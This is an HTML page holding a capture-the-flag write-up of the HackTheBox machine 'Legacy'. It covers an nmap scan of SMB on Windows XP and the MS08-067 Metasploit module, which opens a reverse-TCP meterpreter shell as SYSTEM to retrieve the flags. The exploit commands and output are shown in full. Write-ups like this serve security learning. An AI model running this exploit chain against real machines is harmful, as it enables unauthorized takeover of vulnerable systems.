<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: Legacy HTB Write-Up</title>

    <meta property="og:title" content="Dawnless | Legacy HTB Write-Up">
    <meta property="og:image" content="http://dawnl3ss.me/assets/img/ogimage.jpg">
    <meta property="og:description" content="Legacy HackTheBox Write-Up by Dawnl3ss. MS08-067 SMB exploit via Metasploit on Windows XP.">
    <meta name="author" content="Dawnless">

    <link rel="icon" href="/public/img/icon.jpg" type="image/png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>
            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
            </ul>
            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>Legacy</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://labs.hackthebox.com/storage/avatars/60dc190c4c015cfe3a3aef9b5afca254.png"
                alt="Legacy HTB"
            >
            <div class="writeup-meta">
                <h1>HTB - <span>Legacy</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-easy"><i class="mdi mdi-circle-slice-8"></i> Easy</span>
                    <span class="meta-badge os-windows"><i class="mdi mdi-microsoft-windows"></i> Windows</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-server-network"></i> Windows Security</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> HackTheBox</span>
                </div>
                <div class="tag-list">
                    <span class="tag">ctf</span>
                    <span class="tag">boot2root</span>
                    <span class="tag">smb</span>
                    <span class="tag">windows</span>
                    <span class="tag">metasploit</span>
                    <span class="tag">MS08-067</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Getting a Shell</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://app.hackthebox.com/machines/Legacy" target="_blank">Legacy</a> is a retired machine on HackTheBox.
                The objective is to compromise the target and retrieve both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">Legacy</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#22c55e">Easy</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-microsoft-windows"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Windows</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-server-network"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Windows Security</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>I started by adding the machine IP to <code class="inline">/etc/hosts</code>:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">hosts setup</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Legacy]
└──╼ [★]$</span> <span class="cmd">sudo vim /etc/hosts</span></pre>
            </div>

            <p>Then I ran a full NMAP scan to enumerate open ports and services:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nmap scan results</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Legacy]
└──╼ [★]$</span> <span class="cmd">sudo nmap -sV -sC -p- -Pn legacy.htb</span>
<span class="output">Starting Nmap 7.94SVN at 2024-06-15 20:21 CEST
Nmap scan report for legacy.htb (10.10.10.4)
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
<span class="success">135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds</span>
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY
| smb-os-discovery:
<span class="warning">|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-</span>
|   Computer name: legacy
|_  System time: 2024-06-20T23:19:41+03:00

Nmap done: 1 IP address (1 host up) scanned in 38.88 seconds</span></pre>
            </div>

            <div class="callout warning">
                <i class="mdi mdi-alert-outline"></i>
                <p>Only SMB ports are open (135, 139, 445) and the OS is <strong>Windows XP</strong> - a heavily outdated system with well-known critical vulnerabilities.</p>
            </div>

            <p>
                A quick search for Windows XP SMB exploits leads to the infamous
                <strong>MS08-067</strong> vulnerability. I found the relevant Metasploit module here:
                <a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/" target="_blank">rapid7.com - ms08_067_netapi</a>
            </p>

            <div class="cve-badge">
                <i class="mdi mdi-shield-bug-outline"></i>
                MS08-067 - Windows XP SMB Remote Code Execution (NetAPI)
            </div>
        </section>

        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Getting a Shell</h2>
                </div>
            </div>

            <p>I loaded the exploit in Metasploit, configured the target and listener, then fired it:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">metasploit - MS08-067</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Legacy]
└──╼ [★]$</span> <span class="cmd">msfconsole</span>
<span class="output">
       =[ metasploit v6.3.44-dev ]
+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post ]

[msf]</span> <span class="cmd">use exploit/windows/smb/ms08_067_netapi</span>
<span class="output">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span>

<span class="cmd">set RHOSTS legacy.htb</span>
<span class="output">RHOSTS => legacy.htb</span>

<span class="cmd">set LHOST tun0</span>
<span class="output">LHOST => 10.10.14.5</span>

<span class="cmd">exploit</span>
<span class="output"><span class="warning">[-] Handler failed to bind to 10.10.14.5:4444 - address already in use.</span>
<span class="comment"># Port 4444 was already in use, running exploit again after freeing it:</span></span>

<span class="cmd">exploit</span>
<span class="output">[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
<span class="highlight">[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English</span>
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
<span class="success">[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.4:1035)</span>

(Meterpreter 1)(C:\WINDOWS\system32) ></span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-check-decagram"></i>
                <p>Meterpreter session opened! Since the exploit runs as <strong>SYSTEM</strong>, there is no privilege escalation needed - we have full control of the machine from the start.</p>
            </div>

            <p>Both user and root flags are located under <code class="inline">C:\Documents and Settings\</code>:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">flags</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="output">(Meterpreter 1)(C:\WINDOWS\system32) ></span> <span class="cmd">cd "C:\Documents and Settings"</span>
<span class="output">(Meterpreter 1)(C:\Documents and Settings) ></span> <span class="cmd">search -f user.txt</span>
<span class="success">Found: C:\Documents and Settings\john\Desktop\user.txt</span>
<span class="output">(Meterpreter 1)(C:\Documents and Settings) ></span> <span class="cmd">search -f root.txt</span>
<span class="success">Found: C:\Documents and Settings\Administrator\Desktop\root.txt</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Both flags captured!</strong> Box fully pwned via MS08-067 NetAPI SMB exploit. 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>

<script src="/public/js/wtpage.js"></script>
</body>
</html>